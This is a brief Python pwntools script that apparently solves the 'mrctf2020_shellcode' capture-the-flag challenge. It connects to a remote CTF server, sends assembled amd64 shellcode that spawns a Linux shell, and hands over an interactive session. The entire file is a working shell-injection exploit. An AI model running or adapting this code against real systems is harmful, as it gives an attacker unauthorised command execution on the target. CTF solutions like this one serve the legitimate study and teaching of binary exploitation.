from pwn import *

p = process('./mrctf2020_shellcode')
p = remote('node5.buuoj.cn',26801)
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

shellcode = asm(shellcraft.sh())
p.sendline(shellcode)


p.interactive()

